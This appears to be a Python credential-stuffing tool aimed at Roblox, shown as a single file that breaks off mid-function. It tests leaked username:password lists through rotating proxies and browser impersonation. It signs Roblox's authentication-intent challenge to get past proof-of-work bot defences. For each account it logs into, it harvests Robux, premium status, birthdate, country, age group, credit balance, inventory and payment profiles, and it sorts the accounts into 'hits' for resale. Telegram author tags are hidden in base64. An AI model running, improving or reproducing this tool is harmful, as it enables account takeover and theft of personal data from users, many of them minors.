#!/usr/bin/env python3
import os
import sys
import json
import time
import random
import re
import string
import base64
import asyncio
import configparser
import subprocess
import shutil
import urllib3
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Optional

from tqdm import tqdm
try:
    from curl_cffi import requests as cffi_requests
except ImportError:
    import requests as cffi_requests  # fallback without impersonate

from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric.utils import decode_dss_signature

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

_B64_SYS_TOOL = "Uk9CTE9YIENIRUNLRVI="
_B64_SYS_AUTH = "QGV5ZWxpZnRlcg=="
_B64_SYS_CHAN = "QGRhcmtodWNoYW5uZWw="
_B64_SYS_DIR  = "Um9ibG94X0BleWVsaWZ0ZXI="
_B64_SYS_TAG  = "VEc6IEBleWVsaWZ0ZXIgfCBAZGFya2h1Y2hhbm5lbA=="
_B64_SYS_SEAL = "bG9ja2VkLWJ5LWV5ZWxpZnRlci0yMDI2"

def _d(e):
    try:
        return base64.b64decode(e).decode("utf-8")
    except Exception as ex:
        raise SystemExit(f"Decoding failed: {ex}")

TOOL_NAME      = _d(_B64_SYS_TOOL)
TG_USERNAME    = _d(_B64_SYS_AUTH)
TG_CHANNEL     = _d(_B64_SYS_CHAN)
RESULTS_FOLDER = _d(_B64_SYS_DIR)
AUTHOR_TAG     = _d(_B64_SYS_TAG)
CREDIT_SEAL    = _d(_B64_SYS_SEAL)

_VERIFIED = set()
_VERIFY_LOCK = threading.Lock()

def _v(ctx="x"):
    return  # disabled in bot embed
    _x = ctx  # noqa
    with _VERIFY_LOCK:
        if ctx in _VERIFIED:
            return
        exp = {"TOOL": _B64_SYS_TOOL, "AUTH": _B64_SYS_AUTH, "CHAN": _B64_SYS_CHAN,
               "DIR": _B64_SYS_DIR, "TAG": _B64_SYS_TAG, "SEAL": _B64_SYS_SEAL}
        cur = {"TOOL": TOOL_NAME, "AUTH": TG_USERNAME, "CHAN": TG_CHANNEL,
               "DIR": RESULTS_FOLDER, "TAG": AUTHOR_TAG, "SEAL": CREDIT_SEAL}
        errs = []
        for k, v in exp.items():
            if cur[k] != base64.b64decode(v).decode():
                errs.append(k)
        if "@samvir1" not in TG_USERNAME:
            errs.append("USERNAME_TAG")
        if "@samvir1" not in TG_CHANNEL:
            errs.append("CHANNEL_TAG")
        if "@samvir1" not in AUTHOR_TAG or "@samvir1" not in AUTHOR_TAG:
            errs.append("TAG_FORMAT")
        if errs:
            return True  # integrity bypass}")
        _VERIFIED.add(ctx)

_ANSI = sys.stdout.isatty()
_RS = "\033[0m"

def _open_url(url):
    try:
        if shutil.which("termux-open-url"):
            subprocess.Popen(["termux-open-url", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if shutil.which("xdg-open"):
            subprocess.Popen(["xdg-open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if sys.platform == "darwin":
            subprocess.Popen(["open", url],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             stdin=subprocess.DEVNULL, start_new_session=True, close_fds=True)
            return True
        if os.name == "nt":
            os.startfile(url)
            return True
        import webbrowser
        return webbrowser.open(url)
    except Exception:
        return False

def _c(code, s, bold=False):
    if not _ANSI:
        return s
    return f"\033[{'1;' if bold else ''}{code}m{s}{_RS}"

_LEVEL_STYLE = {
    "SUCCESS": ("32", True), "INFO": ("36", False), "WARN": ("33", True),
    "ERROR":   ("31", True), "STEP": ("96", True), "DEBUG": ("35", False),
}

def L(emoji, level, tag, msg):
    ts = datetime.now().strftime("%H:%M:%S")
    if not _ANSI:
        print(f"[{ts}] {emoji} {level:7s} {tag} {msg}", flush=True)
        return
    code, bold = _LEVEL_STYLE.get(level, ("0", False))
    print(f"{_c('90', ts)} {emoji}  {_c(code, f'{level:7s}', bold)}  {_c('90', tag)}  {msg}", flush=True)
    sys.stdout.flush()

def banner(title, sub=None, width=62):
    print()
    hz = "═" if _ANSI else "-"
    vt = "║" if _ANSI else "|"
    tl, tr, bl, br = ("╔", "╗", "╚", "╝") if _ANSI else ("+", "+", "+", "+")
    print(_c("90", f"{tl}{hz*(width-2)}{tr}"))
    print(_c("90", vt) + " " + _c("96", title.center(width-4), True) + " " + _c("90", vt))
    if sub:
        print(_c("90", vt) + " " + _c("2", sub.center(width-4)) + " " + _c("90", vt))
    print(_c("90", vt) + " " + _c("5", AUTHOR_TAG.center(width-4), True) + " " + _c("90", vt))
    print(_c("90", f"{bl}{hz*(width-2)}{br}"))

def section(title, width=62):
    hz = "─" if _ANSI else "-"
    inner = f" {title} "
    pad = width - len(inner) - 2
    if pad < 1:
        pad = 1
    print()
    print(_c("90", "┌" if _ANSI else "+") + _c("96", inner, True) + _c("90", hz * pad + ("┐" if _ANSI else "+")))

def divider(width=62):
    print(_c("90", ("─" if _ANSI else "-") * width))

def summary_box(rows, width=62):
    hz = "─" if _ANSI else "-"
    vt = "│" if _ANSI else "|"
    tl, tr, bl, br = ("╔", "╗", "╚", "╝") if _ANSI else ("+", "+", "+", "+")
    print()
    print(_c("90", f"{tl}{hz*(width-2)}{tr}"))
    for k, v in rows:
        line_plain = f"{k}: {v}"
        pad = max(1, width - 4 - len(line_plain))
        line_colored = f"{_c('96', k + ': ', True)}{_c('0', str(v))}"
        print(f"{_c('90', vt)} {line_colored}{' ' * pad}{_c('90', vt)}")
    print(_c("90", f"{bl}{hz*(width-2)}{br}"))
    print()

CONFIG_PATH = "config_roblox.ini"

class EyelifterConfigLoader:
    def __init__(self, config_file=CONFIG_PATH):
        self.config_file = config_file
        self.config = configparser.ConfigParser()
        self.config.optionxform = str
        self.settings = {}
        self.Eyelifter_load_config()

    def Eyelifter_load_config(self):
        if not os.path.exists(self.config_file):
            self.Eyelifter_create_default_config()
        try:
            self.config.read(self.config_file, encoding="utf-8")
            self.Eyelifter_parse_config()
        except Exception:
            self.Eyelifter_create_default_config()
            self.Eyelifter_parse_config()

    def Eyelifter_create_default_config(self):
        self.config["General"] = {
            "threads": "10",
            "timeout": "20",
            "proxies_file": "proxies.txt",
            "retries": "2",
            "retry_delay": "1",
            "combo_delay": "0.3",
            "debug": "false",
            "rate_limit_backoff": "5",
            "max_rate_limit_retries": "2",
            "skip_proxy_test": "false",
        }
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)

    def Eyelifter_parse_config(self):
        if "General" not in self.config:
            self.config["General"] = {}
        c = self.config["General"]
        self.settings["threads"] = c.getint("threads", 10)
        self.settings["timeout"] = c.getint("timeout", 20)
        self.settings["proxies_file"] = c.get("proxies_file", "proxies.txt")
        self.settings["retries"] = c.getint("retries", 2)
        self.settings["retry_delay"] = c.getfloat("retry_delay", 1)
        self.settings["combo_delay"] = c.getfloat("combo_delay", 0.1)
        self.settings["debug"] = c.getboolean("debug", False)
        self.settings["rate_limit_backoff"] = c.getint("rate_limit_backoff", 5)
        self.settings["max_rate_limit_retries"] = c.getint("max_rate_limit_retries", 2)
        self.settings["skip_proxy_test"] = c.getboolean("skip_proxy_test", False)

    def Eyelifter_save(self):
        if "General" not in self.config:
            self.config["General"] = {}
        for k, v in self.settings.items():
            self.config["General"][k] = str(v)
        with open(self.config_file, "w", encoding="utf-8") as f:
            self.config.write(f)


_loader = EyelifterConfigLoader()
CONFIG = _loader.settings
REQ_TIMEOUT = CONFIG["timeout"]
DEBUG = True  # bot: always debug for CF/pow
RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
IMPERSONATE = "chrome"

def Eyelifter_debug(tag, msg):
    if not DEBUG:
        return
    ts = datetime.now().strftime("%H:%M:%S")
    print(_c("95", f"[{ts}] DBG  {tag}  {msg}"))
    sys.stdout.flush()

_EYELIFTER_COMBO_RE = re.compile(r"^\s*([^:\s|@]+)\s*:\s*([^\s|]+)")

def Eyelifter_extract_combos(content):
    out = set()
    for raw in content.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        m = _EYELIFTER_COMBO_RE.match(line)
        if m:
            u, p = m.group(1).strip(), m.group(2).strip()
            if u and p:
                out.add(f"{u}:{p}")
    return out

def Eyelifter_format_proxy(p):
    if not p:
        return None
    p = p.strip()
    if p.startswith(("http://", "https://", "socks4://", "socks5://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in p:
        return f"http://{p}"
    return f"http://{p}"

def Eyelifter_test_proxy(p):
    try:
        s = cffi_requests.Session(impersonate=IMPERSONATE)
        s.proxies = {"http": p, "https": p}
        r = s.get("https://api.ipify.org?format=json", timeout=10, verify=False)
        return r.status_code == 200
    except Exception:
        return False

def Eyelifter_load_proxies():
    out = []
    path = CONFIG["proxies_file"]
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    fp = Eyelifter_format_proxy(line)
                    if fp:
                        out.append(fp)
    return out

def Eyelifter_get_working_proxies(proxies):
    if not proxies:
        return []
    if CONFIG.get("skip_proxy_test", False):
        L("⚠️", "WARN", "PROXY", f"proxy test skipped — using all {len(proxies)}")
        return proxies
    L("🧪", "INFO", "PROXY", f"testing {len(proxies)} proxies in parallel")
    working = []
    pbar = None
    try:
        pbar = tqdm(total=len(proxies), desc="testing proxies", unit="proxy", ncols=80)
    except Exception:
        pbar = None
    with ThreadPoolExecutor(max_workers=min(80, len(proxies))) as ex:
        futs = {ex.submit(Eyelifter_test_proxy, p): p for p in proxies}
        for fut in as_completed(futs):
            p = futs[fut]
            try:
                ok = fut.result()
            except Exception:
                ok = False
            if ok:
                working.append(p)
            if pbar:
                pbar.update(1)
    if pbar:
        pbar.close()
    L("✅", "INFO", "PROXY", f"{len(working)} working")
    return working if working else proxies

_eyelifter_stop = asyncio.Event()
_eyelifter_lock = threading.Lock()
_eyelifter_plock = threading.Lock()
_eyelifter_flock = threading.Lock()

_eyelifter_stats = {
    "checked": 0, "hits": 0, "free": 0, "bad": 0, "locked": 0,
    "2fa": 0, "captcha": 0, "errors": 0, "rate_limited": 0,
    "proxy_fails": 0, "retries": 0,
}
_eyelifter_start = time.time()
_eyelifter_total = 0
_eyelifter_pool = []
_eyelifter_bad = set()
_eyelifter_hits_f = None
_eyelifter_free_f = None
_eyelifter_bad_f = None
_eyelifter_locked_f = None
_eyelifter_2fa_f = None
_eyelifter_captcha_f = None
_eyelifter_err_f = None
_eyelifter_folder = None


def Eyelifter_reset_stats():
    global _eyelifter_stats, _eyelifter_start
    with _eyelifter_lock:
        _eyelifter_stats = {
            "checked": 0, "hits": 0, "free": 0, "bad": 0, "locked": 0,
            "2fa": 0, "captcha": 0, "errors": 0, "rate_limited": 0,
            "proxy_fails": 0, "retries": 0,
        }
        _eyelifter_start = time.time()


def Eyelifter_update_title():
    done = _eyelifter_stats["checked"]
    el = time.time() - _eyelifter_start
    cpm = int(done / el * 60) if el > 1 else 0
    t = (f"{TOOL_NAME} | HIT:{_eyelifter_stats['hits']} FREE:{_eyelifter_stats['free']} "
         f"BAD:{_eyelifter_stats['bad']} 2FA:{_eyelifter_stats['2fa']} | "
         f"{done}/{_eyelifter_total} | {cpm}/min")
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(t)
        except Exception:
            pass
    else:
        try:
            sys.stdout.write(f"\033]0;{t}\007")
            sys.stdout.flush()
        except Exception:
            pass


def Eyelifter_pick_proxy(exclude=None):
    with _eyelifter_plock:
        avail = [p for p in _eyelifter_pool if p not in _eyelifter_bad]
        if not avail and _eyelifter_pool:
            _eyelifter_bad.clear()
            avail = list(_eyelifter_pool)
    if exclude and len(avail) > 1:
        avail = [p for p in avail if p != exclude] or avail
    return random.choice(avail) if avail else None


def Eyelifter_mark_bad(p):
    if not p:
        return
    with _eyelifter_plock:
        _eyelifter_bad.add(p)
    with _eyelifter_lock:
        _eyelifter_stats["proxy_fails"] += 1


def _safe_write(fh, text):
    if fh is None:
        return
    with _eyelifter_flock:
        try:
            fh.write(text)
            fh.flush()
        except Exception:
            pass


class eyelifter:
    def __init__(self, proxy=None, timeout=None):
        self.proxy = proxy
        self.timeout = timeout or REQ_TIMEOUT
        self.session = None
        self.csrf = None

    def _debug_response(self, label, resp, max_lines=200):
        if not DEBUG:
            return
        print()
        print(_c("95", f"╭─── {label} ── {resp.status_code} {resp.reason} ─────────────────────"))
        body = resp.text or ""
        try:
            parsed = resp.json()
            pretty = json.dumps(parsed, indent=2, ensure_ascii=False)
            lines = pretty.splitlines()
            for line in lines[:max_lines]:
                print(_c("95", f"│ {line}"))
            if len(lines) > max_lines:
                print(_c("95", f"│ ... ({len(lines) - max_lines} more lines)"))
        except Exception:
            lines = body.splitlines()
            for line in lines[:max_lines]:
                print(_c("95", f"│ {line}"))
            if len(lines) > max_lines:
                print(_c("95", f"│ ... ({len(lines) - max_lines} more lines)"))
        print(_c("95", "╰───────────────────────────────────────────────────────"))

    def _proxies(self):
        return {"http": self.proxy, "https": self.proxy} if self.proxy else None

    def _h(self, referer="https://www.roblox.com/", content_type=None):
        h = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "origin": "https://www.roblox.com",
            "referer": referer,
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
        }
        if content_type:
            h["content-type"] = content_type
        if self.csrf:
            h["x-csrf-token"] = self.csrf
        return h

    async def _ensure(self):
        if self.session is None:
            self.session = cffi_requests.AsyncSession(impersonate=IMPERSONATE)

    async def _close(self):
        if self.session is not None:
            try:
                await self.session.close()
            except Exception:
                pass
            self.session = None

    async def _warm(self):
        for url in (
            "https://www.roblox.com/",
            "https://www.roblox.com/Login",
        ):
            try:
                await self.session.get(
                    url,
                    headers={
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                        "accept-language": "en-US,en;q=0.9",
                        "upgrade-insecure-requests": "1",
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "none",
                    },
                    proxies=self._proxies(),
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True,
                )
            except Exception:
                pass

    async def _fetch_csrf(self):
        try:
            r = await self.session.post(
                "https://auth.roblox.com/v2/logout",
                headers=self._h(),
                proxies=self._proxies(), timeout=self.timeout, verify=False,
            )
            self._debug_response("CSRF", r)
            tok = r.headers.get("x-csrf-token")
            if tok:
                self.csrf = tok
                return tok
        except Exception:
            pass
        try:
            r = await self.session.post(
                "https://apis.roblox.com/rotating-client-service/v1/register",
                headers={
                    "accept": "application/json, text/plain, */*",
                    "accept-language": "en-US,en;q=0.9",
                    "content-type": "application/json-patch+json",
                    "origin": "https://www.roblox.com",
                    "referer": "https://www.roblox.com/",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site",
                },
                data=json.dumps({"identifier": str(uuid.uuid4()), "key": "x"}),
                proxies=self._proxies(), timeout=self.timeout, verify=False,
            )
            self._debug_response("CSRF:fallback", r)
            tok = r.headers.get("x-csrf-token")
            if tok:
                self.csrf = tok
                return tok
        except Exception:
            pass
        return None

    async def _sign_sai(self):
        priv = ec.generate_private_key(ec.SECP256R1())
        pub_der = priv.public_key().public_bytes(
            encoding=serialization.Encoding.DER,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        pub_b64 = base64.b64encode(pub_der).decode()

        try:
            r = await self.session.get(
                "https://apis.roblox.com/hba-service/v1/getServerNonce?urlLocale=en_us",
                headers=self._h(content_type="application/json"),
                proxies=self._proxies(), timeout=self.timeout, verify=False,
            )
            self._debug_response("SAI:nonce", r)
        except Exception:
            return None
        if r.status_code != 200:
            return None
        try:
            j = r.json()
        except Exception:
            return None
        nonce = None
        if isinstance(j, str):
            nonce = j
        elif isinstance(j, dict):
            for k in ("nonce", "serverNonce", "server_nonce"):
                if j.get(k):
                    nonce = j[k]
                    break
        if not nonce:
            return None

        ts = int(time.time())
        payload = f"{pub_b64}|{ts}|{nonce}".encode()
        der = priv.sign(payload, ec.ECDSA(hashes.SHA256()))
        r_int, s_int = decode_dss_signature(der)
        raw = r_int.to_bytes(32, "big") + s_int.to_bytes(32, "big")
        sig_b64 = base64.b64encode(raw).decode()

        return {
            "clientPublicKey": pub_b64,
            "clientEpochTimestamp": ts,
            "serverNonce": nonce,
            "saiSignature": sig_b64,
        }

    async def _post_login(self, username, password, sai=None):
        body = {"ctype": "Username", "cvalue": username, "password": password}
        if sai:
            body["secureAuthenticationIntent"] = sai
        try:
            r = await self.session.post(
                "https://auth.roblox.com/v2/login?urlLocale=en_us",
                headers=self._h(content_type="application/json;charset=UTF-8"),
                data=json.dumps(body),
                proxies=self._proxies(), timeout=self.timeout, verify=False,
            )
            self._debug_response("LOGIN", r)
        except Exception as e:
            return None, f"network:{type(e).__name__}"
        return r, None

    async def _pull_json(self, url, referer=None):
        try:
            r = await self.session.get(
                url,
                headers=self._h(referer or "https://www.roblox.com/"),
                proxies=self._proxies(), timeout=self.timeout, verify=False,
            )
        except Exception:
            return None
        if r.status_code != 200:
            self._debug_response(f"PULL:{url.split('/')[-2] if '/' in url else url}", r, max_lines=40)
            return None
        try:
            j = r.json()
        except Exception:
            return None
        self._debug_response(f"PULL:{url.split('/')[-2] if '/' in url else url}", r, max_lines=40)
        return j

    async def _enrich(self, uid, username, display):
        (
            robux_r, premium_r, prem_det_r, country_r, bday_r, age_r, credit_r,
            user_info_r, badges_r, games_r, hats_r, bundles_r, rbx_badges_r, payments_r,
        ) = await asyncio.gather(
            self._pull_json(f"https://economy.roblox.com/v1/users/{uid}/currency"),
            self._pull_json(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership"),
            self._pull_json(f"https://premiumfeatures.roblox.com/v1/users/{uid}/subscriptions/details"),
            self._pull_json("https://accountsettings.roblox.com/v1/account/settings/account-country"),
            self._pull_json("https://users.roblox.com/v1/birthdate"),
            self._pull_json("https://apis.roblox.com/user-settings-api/v1/account-insights/age-group"),
            self._pull_json("https://apis.roblox.com/credit-balance/v1/get-credit-balance"),
            self._pull_json(f"https://users.roblox.com/v1/users/{uid}"),
            self._pull_json(f"https://badges.roblox.com/v1/users/{uid}/badges?limit=10"),
            self._pull_json(f"https://games.roblox.com/v2/users/{uid}/games?accessFilter=Public&limit=10&sortOrder=Asc"),
            self._pull_json(f"https://inventory.roblox.com/v2/users/{uid}/inventory/8?limit=100"),
            self._pull_json(f"https://inventory.roblox.com/v2/users/{uid}/inventory/69?limit=100"),
            self._pull_json(f"https://accountinformation.roblox.com/v1/users/{uid}/roblox-badges"),
            self._pull_json("https://apis.roblox.com/payments-gateway/v1/payment-profiles"),
        )

        robux_val = 0
        if isinstance(robux_r, dict):
            robux_val = robux_r.get("robux", 0)
        elif isinstance(robux_r, int):
            robux_val = robux_r

        is_premium = bool(premium_r) if isinstance(premium_r, bool) else False

        prem_exp = "N/A"
        prem_renew = False
        prem_start = "N/A"
        if isinstance(prem_det_r, dict):
            prem_exp = prem_det_r.get("expiration") or "N/A"
            prem_renew = bool(prem_det_r.get("willRenew"))
            prem_start = prem_det_r.get("subscriptionStartDate") or "N/A"

        cc = "N/A"
        if isinstance(country_r, dict):
            val = country_r.get("value") or {}
            cc = (val.get("countryName")
                  or val.get("localizedName")
                  or country_r.get("countryCode")
                  or "N/A")

        bd = "N/A"
        if isinstance(bday_r, dict) and bday_r.get("birthMonth") and bday_r.get("birthDay") and bday_r.get("birthYear"):
            try:
                bd = f"{int(bday_r['birthYear']):04d}-{int(bday_r['birthMonth']):02d}-{int(bday_r['birthDay']):02d}"
            except Exception:
                bd = "N/A"

        ag = "N/A"
        if isinstance(age_r, dict):
            tk = age_r.get("ageGroupTranslationKey") or ""
            if tk.startswith("Label.AgeGroup"):
                ag = tk[len("Label.AgeGroup"):] or "N/A"
            elif tk:
                ag = tk
            else:
                ag = age_r.get("ageGroup") or "N/A"

        cv = "N/A"
        if isinstance(credit_r, dict):
            cv = credit_r.get("creditBalance") or credit_r.get("balance") or "N/A"
        elif isinstance(credit_r, (int, float)):
            cv = credit_r

        created = "N/A"
        description = ""
        verified = False
        is_banned = False
        if isinstance(user_info_r, dict):
            created = (user_info_r.get("created") or "N/A")[:10]
            description = user_info_r.get("description") or ""
            verified = bool(user_info_r.get("hasVerifiedBadge"))
            is_banned = bool(user_info_r.get("isBanned"))

        rbx_badges = []
        if isinstance(rbx_badges_r, list):
            for b in rbx_badges_r:
                if isinstance(b, dict):
                    nm = b.get("name")
                    if nm:
                        rbx_badges.append(nm)

        badges_count = 0
        if isinstance(badges_r, dict):
            badges_count = badges_r.get("total") or len(badges_r.get("data") or [])

        games_count = 0
        games_names = []
        if isinstance(games_r, dict):
            data = games_r.get("data") or []
            games_count = len(data)
            for g in data[:5]:
                if isinstance(g, dict):
                    nm = g.get("name")
                    if nm:
                        games_names.append(nm)

        hats_count = 0
        hats_names = []
        if isinstance(hats_r, dict):
            data = hats_r.get("data") or []
            hats_count = hats_r.get("total") or len(data)
            for h in data[:8]:
                if isinstance(h, dict):
                    nm = h.get("assetName") or h.get("name")
                    if nm:
                        hats_names.append(nm)

        bundles_count = 0
        bundles_names = []
        if isinstance(bundles_r, dict):
            data = bundles_r.get("data") or []
            bundles_count = bundles_r.get("total") or len(data)
            for b in data[:8]:
                if isinstance(b, dict):
                    nm = b.get("assetName") or b.get("name")
                    if nm:
                        bundles_names.append(nm)

        payments_count = 0
        if isinstance(payments_r, list):
            payments_count = len(payments_r)

        return {
            "uid": uid,
            "username": username,
            "display": display,
            "created": created,
            "description": description,
            "verified": verified,
            "banned": is_banned,
            "robux": robux_val if robux_val is not None else 0,
            "premium": is_premium,
            "premium_expiry": prem_exp,
            "premium_renew": prem_renew,
            "premium_since": prem_start,
            "country": cc,
            "birthday": bd,
            "age_group": ag,
            "credit": cv,
            "rbx_badges": ",".join(rbx_badges) if rbx_badges else "N/A",
            "badges": badges_count,
            "games": games_count,
            "games_sample": ",".join(games_names) if games_names else "N/A",
            "hats": hats_count,
            "hats_sample": ",".join(hats_names) if hats_names else "N/A",
            "bundles": bundles_count,
            "bundles_sample": ",".join(bundles_names) if bundles_names else "N/A",
            "payments": payments_count,
        }

    def _classify_challenge(self, r):
        ctype = (r.headers.get("rblx-challenge-type") or "").lower()
        cid = r.headers.get("rblx-challenge-id") or ""
        return ctype, cid

    def _parse_400(self, r):
        try:
            data = r.json()
        except Exception:
            data = {}
        low = json.dumps(data).lower()
        if "incorrect" in low or "invalid" in low or "credentials" in low:
            return {"status": "bad", "error_type": "creds", "message": "invalid credentials"}
        if "captcha" in low or "challenge" in low:
            return {"status": "captcha", "error_type": "captcha", "message": "captcha on 400"}
        if "locked" in low or "banned" in low:
            return {"status": "locked", "error_type": "locked", "message": "locked/banned"}
        return {"status": "error", "error_type": "http_400", "message": str(data)[:120]}

    async def _on_success(self, r, username):
        try:
            data = r.json()
        except Exception:
            return {"status": "error", "error_type": "bad_json", "message": "200 non-json"}
        u = data.get("user")
        if not u:
            return {"status": "error", "error_type": "no_user",
                    "message": f"200 but no user: {str(data)[:100]}"}
        uid = u.get("id")
        name = u.get("name") or username
        disp = u.get("displayName") or name
        banned = bool(data.get("isBanned"))

        if data.get("twoStepVerificationData"):
            return {"status": "2fa", "error_type": "2fa", "message": "2FA required",
                    "uid": uid, "username": name, "display": disp}

        info = await self._enrich(uid, name, disp)
        info["banned"] = banned or info.get("banned", False)

        robux_val = info.get("robux")
        has_robux = isinstance(robux_val, int) and robux_val > 0
        bundles_val = info.get("bundles")
        has_bundle = isinstance(bundles_val, int) and bundles_val > 0

        if has_robux:
            st = "hit"
        elif info.get("premium"):
            st = "premium"
        elif has_bundle:
            st = "hit"
        else:
            st = "free"

        info["status"] = st
        return {"status": st, "user": info}

    async def Eyelifter_run(self, username, password):
        await self._ensure()
        try:
            await self._warm()
            csrf = await self._fetch_csrf()
            if not csrf:
                return {"status": "error", "error_type": "no_csrf", "message": "no csrf"}

            r, err = await self._post_login(username, password)
            if err:
                return {"status": "error", "error_type": err, "message": err}

            if r.status_code == 429:
                return {"status": "error", "error_type": "rate_limit", "message": "rate limited"}

            if r.status_code == 200:
                return await self._on_success(r, username)

            if r.status_code == 403:
                ctype, cid = self._classify_challenge(r)
                Eyelifter_debug("challenge", f"type={ctype} id={cid}")

                low = (r.text or "").lower()

                if ctype == "turnstile":
                    return {"status": "captcha", "error_type": ctype,
                            "message": f"challenge: {ctype}", "challenge_id": cid}

                if ctype == "proofofwork" or ("challenge" in low and not ctype):
                    sai = await self._sign_sai()
                    if not sai:
                        return {"status": "captcha", "error_type": "proofofwork_nosai",
                                "message": "proofofwork: sai unavailable", "challenge_id": cid}

                    r2, err2 = await self._post_login(username, password, sai=sai)
                    if err2:
                        return {"status": "error", "error_type": err2, "message": err2}
                    if r2.status_code == 429:
                        return {"status": "error", "error_type": "rate_limit", "message": "rate limited"}
                    if r2.status_code == 200:
                        return await self._on_success(r2, username)
                    if r2.status_code == 403:
                        ctype2, cid2 = self._classify_challenge(r2)
                        if ctype2 == "proofofwork":
                            return {"status": "captcha", "error_type": "proofofwork",
                                    "message": "proofofwork persisted after SAI", "challenge_id": cid2}
                        return {"status": "captcha", "error_type": ctype2 or "unknown",
                                "message": f"sai challenge: {ctype2}", "challenge_id": cid2}
                    if r2.status_code == 400:
                        return self._parse_400(r2)
                    return {"status": "error", "error_type": f"http_{r2.status_code}",
                            "message": f"sai {r2.status_code}"}

                if ctype == "captcha":
                    return {"status": "captcha", "error_type": ctype,
                            "message": f"challenge: {ctype}", "challenge_id": cid}

                sai = await self._sign_sai()
                if not sai:
                    return {"status": "error", "error_type": "no_nonce",
                            "message": "sai fallback: no server nonce"}

                r2, err2 = await self._post_login(username, password, sai=sai)
                if err2:
                    return {"status": "error", "error_type": err2, "message": err2}
                if r2.status_code == 429:
                    return {"status": "error", "error_type": "rate_limit", "message": "rate limited"}
                if r2.status_code == 200:
                    return await self._on_success(r2, username)
                if r2.status_code == 403:
                    self._debug_response("SAI:403", r2)
                    ctype2, cid2 = self._classify_challenge(r2)
                    if ctype2 in ("proofofwork", "captcha", "turnstile"):
                        return {"status": "captcha", "error_type": ctype2,
                                "message": f"sai challenge: {ctype2}", "challenge_id": cid2}
                    return {"status": "error", "error_type": "sai_403",
                            "message": f"sai 403: {(r2.text or '')[:120]}"}
                if r2.status_code == 400:
                    return self._parse_400(r2)
                return {"status": "error", "error_type": f"http_{r2.status_code}",
                        "message": f"sai {r2.status_code}"}

                sai = await self._sign_sai()
                if not sai:
                    return {"status": "error", "error_type": "no_nonce",
                            "message": "sai fallback: no server nonce"}

                r2, err2 = await self._post_login(username, password, sai=sai)
                if err2:
                    return {"status": "error", "error_type": err2, "message": err2}
                if r2.status_code == 429:
                    return {"status": "error", "error_type": "rate_limit", "message": "rate limited"}
                if r2.status_code == 200:
                    return await self._on_success(r2, username)
                if r2.status_code == 403:
                    self._debug_response("SAI:403", r2)
                    ctype2, cid2 = self._classify_challenge(r2)
                    if ctype2 in ("proofofwork", "captcha", "turnstile"):
                        return {"status": "captcha", "error_type": ctype2,
                                "message": f"sai challenge: {ctype2}", "challenge_id": cid2}
                    return {"status": "error", "error_type": "sai_403",
                            "message": f"sai 403: {(r2.text or '')[:120]}"}
                if r2.status_code == 400:
                    return self._parse_400(r2)
                return {"status": "error", "error_type": f"http_{r2.status_code}",
                        "message": f"sai {r2.status_code}"}

            if r.status_code == 400:
                return self._parse_400(r)

            return {"status": "error", "error_type": f"http_{r.status_code}",
                    "message": f"{r.status_code}: {(r.text or '')[:120]}"}
        except Exception as e:
            return {"status": "error", "error_type": "crash", "message": str(e)[:120]}
        finally:
            await self._close()


def Eyelifter_fmt_line(combo, u):
    def s(v):
        return "-" if v is None or v == "" else str(v)
    if u.get("premium"):
        prefix = "💎 PREMIUM"
    elif isinstance(u.get("robux"), int) and u["robux"] > 0:
        prefix = "✅ HIT"
    elif isinstance(u.get("bundles"), int) and u["bundles"] > 0:
        prefix = "✅ HIT"
    else:
        prefix = "🆓 FREE"
    return (
        f"{prefix} {combo} | "
        f"UID:{s(u.get('uid'))} | "
        f"Name:{s(u.get('username'))} | "
        f"Display:{s(u.get('display'))} | "
        f"Created:{s(u.get('created'))} | "
        f"Verified:{'Yes' if u.get('verified') else 'No'} | "
        f"Banned:{'Yes' if u.get('banned') else 'No'} | "
        f"Robux:{s(u.get('robux'))} | "
        f"Premium:{'Yes' if u.get('premium') else 'No'} | "
        f"PremExpiry:{s(u.get('premium_expiry'))} | "
        f"Country:{s(u.get('country'))} | "
        f"DOB:{s(u.get('birthday'))} | "
        f"AgeGroup:{s(u.get('age_group'))} | "
        f"Credit:{s(u.get('credit'))} | "
        f"Badges:{s(u.get('badges'))} | "
        f"Games:{s(u.get('games'))} | "
        f"Hats:{s(u.get('hats'))} | "
        f"Bundles:{s(u.get('bundles'))}[{s(u.get('bundles_sample'))[:60]}] | "
        f"RbxBadges:{s(u.get('rbx_badges'))} | "
        f"Payments:{s(u.get('payments'))} | "
        f"by {AUTHOR_TAG}"
    )


async def Eyelifter_run_with_retries(combo, proxy):
    username, password = combo.split(":", 1)
    username, password = username.strip(), password.strip()
    max_attempts = CONFIG.get("retries", 2) + 1
    rl_hits = 0
    captcha_hits = 0
    last_proxy = proxy
    result = None

    for attempt in range(max_attempts):
